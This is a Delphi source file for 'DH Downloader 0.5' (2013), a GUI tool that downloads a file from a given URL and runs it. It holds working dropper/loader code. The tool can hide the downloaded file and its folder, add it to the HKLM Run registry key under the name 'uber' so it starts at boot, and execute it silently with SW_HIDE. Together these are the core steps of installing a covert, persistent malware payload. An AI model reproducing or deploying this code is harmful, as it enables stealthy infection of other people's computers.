// DH Downloader 0.5
// (C) Doddy Hackman 2013

unit usbmode;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, acPNG, ExtCtrls, ComCtrls, sStatusBar, StdCtrls, sGroupBox, sEdit,
  sLabel, sCheckBox, sRadioButton, sButton, acProgressBar, IdBaseComponent,
  IdComponent, IdTCPConnection, IdTCPClient, IdHTTP, Registry, ShellApi;

type
  TForm3 = class(TForm)
    Image1: TImage;
    sStatusBar1: TsStatusBar;
    sGroupBox1: TsGroupBox;
    sGroupBox2: TsGroupBox;
    sEdit1: TsEdit;
    sGroupBox3: TsGroupBox;
    sCheckBox1: TsCheckBox;
    sEdit2: TsEdit;
    sCheckBox2: TsCheckBox;
    sEdit3: TsEdit;
    sCheckBox3: TsCheckBox;
    sCheckBox4: TsCheckBox;
    sCheckBox5: TsCheckBox;
    sRadioButton1: TsRadioButton;
    sRadioButton2: TsRadioButton;
    sGroupBox4: TsGroupBox;
    sButton1: TsButton;
    sProgressBar1: TsProgressBar;
    IdHTTP1: TIdHTTP;
    procedure sButton1Click(Sender: TObject);
    procedure IdHTTP1Work(ASender: TObject; AWorkMode: TWorkMode;
      AWorkCount: Int64);
    procedure IdHTTP1WorkBegin(ASender: TObject; AWorkMode: TWorkMode;
      AWorkCountMax: Int64);
    procedure IdHTTP1WorkEnd(ASender: TObject; AWorkMode: TWorkMode);
    procedure FormCreate(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form3: TForm3;

implementation

uses about, dh;
{$R *.dfm}
// Functions

function getfilename(archivo: string): string;
var
  test: TStrings;
begin

  test := TStringList.Create;
  test.Delimiter := '/';
  test.DelimitedText := archivo;
  Result := test[test.Count - 1];

  test.Free;

end;

//

procedure TForm3.FormCreate(Sender: TObject);
begin
  sProgressBar1.Position := 0;
end;

procedure TForm3.IdHTTP1Work(ASender: TObject; AWorkMode: TWorkMode;
  AWorkCount: Int64);
begin
  sProgressBar1.Position := AWorkCount;
  sStatusBar1.Panels[0].Text := '[+] Downloading ...';
  sStatusBar1.Update;
end;

procedure TForm3.IdHTTP1WorkBegin(ASender: TObject; AWorkMode: TWorkMode;
  AWorkCountMax: Int64);
begin
  sProgressBar1.Max := AWorkCountMax;
  sStatusBar1.Panels[0].Text := '[+] Starting download ...';
  sStatusBar1.Update;
end;

procedure TForm3.IdHTTP1WorkEnd(ASender: TObject; AWorkMode: TWorkMode);
begin
  sProgressBar1.Position := 0;
end;

procedure TForm3.sButton1Click(Sender: TObject);
var
  filename: string;
  nombrefinal: string;
  addnow: TRegistry;
  archivobajado: TFileStream;

begin

  if not sCheckBox1.Checked then
  begin
    filename := sEdit1.Text;
    nombrefinal := getfilename(filename);
  end
  else
  begin
    nombrefinal := sEdit2.Text;
  end;

  archivobajado := TFileStream.Create(nombrefinal, fmCreate);

  try
    begin
      DeleteFile(nombrefinal);
      IdHTTP1.Get(sEdit1.Text, archivobajado);
      sStatusBar1.Panels[0].Text := '[+] File Dowloaded';
      sStatusBar1.Update;
      archivobajado.Free;
    end;
  except
    sStatusBar1.Panels[0].Text := '[-] Failed download';
    sStatusBar1.Update;
    archivobajado.Free;
    Abort;
  end;

  if FileExists(nombrefinal) then
  begin

    if sCheckBox2.Checked then
    begin
      if not DirectoryExists(sEdit3.Text) then
      begin
        CreateDir(sEdit3.Text);
      end;
      MoveFile(Pchar(nombrefinal), Pchar(sEdit3.Text + '/' + nombrefinal));
      sStatusBar1.Panels[0].Text := '[+] File Moved';
      sStatusBar1.Update;
    end;

    if sCheckBox3.Checked then
    begin
      SetFileAttributes(Pchar(sEdit3.Text), FILE_ATTRIBUTE_HIDDEN);
      if sCheckBox2.Checked then
      begin
        SetFileAttributes(Pchar(sEdit3.Text + '/' + nombrefinal),
          FILE_ATTRIBUTE_HIDDEN);

        sStatusBar1.Panels[0].Text := '[+] File Hidden';
        sStatusBar1.Update;
      end
      else
      begin
        SetFileAttributes(Pchar(nombrefinal), FILE_ATTRIBUTE_HIDDEN);
        sStatusBar1.Panels[0].Text := '[+] File Hidden';
        sStatusBar1.Update;
      end;
    end;

    if sCheckBox4.Checked then
    begin

      addnow := TRegistry.Create;
      addnow.RootKey := HKEY_LOCAL_MACHINE;
      addnow.OpenKey('Software\Microsoft\Windows\CurrentVersion\Run', FALSE);

      if sCheckBox2.Checked then
      begin
        addnow.WriteString('uber', sEdit3.Text + '/' + nombrefinal);
      end
      else
      begin
        addnow.WriteString('uber', ExtractFilePath(Application.ExeName)
            + '/' + nombrefinal);
      end;

      sStatusBar1.Panels[0].Text := '[+] Registry Updated';
      sStatusBar1.Update;

      addnow.Free;

    end;

    if sCheckBox5.Checked then
    begin

      if sRadioButton1.Checked then
      begin
        if sCheckBox2.Checked then
        begin
          ShellExecute(Handle, 'open', Pchar(sEdit3.Text + '/' + nombrefinal),
            nil, nil, SW_SHOWNORMAL);
        end
        else
        begin
          ShellExecute(Handle, 'open', Pchar(nombrefinal), nil, nil,
            SW_SHOWNORMAL);
        end;
      end
      else
      begin
        if sCheckBox2.Checked then
        begin
          ShellExecute(Handle, 'open', Pchar(sEdit3.Text + '/' + nombrefinal),
            nil, nil, SW_HIDE);
        end
        else
        begin
          ShellExecute(Handle, 'open', Pchar(nombrefinal), nil, nil, SW_HIDE);
        end;
      end;

    end;

    if sCheckBox1.Checked or sCheckBox2.Checked or sCheckBox3.Checked or
      sCheckBox4.Checked or sCheckBox5.Checked then
    begin
      sStatusBar1.Panels[0].Text := '[+] Finished';
      sStatusBar1.Update;
    end;

  end;

end;

end.

// The End ?
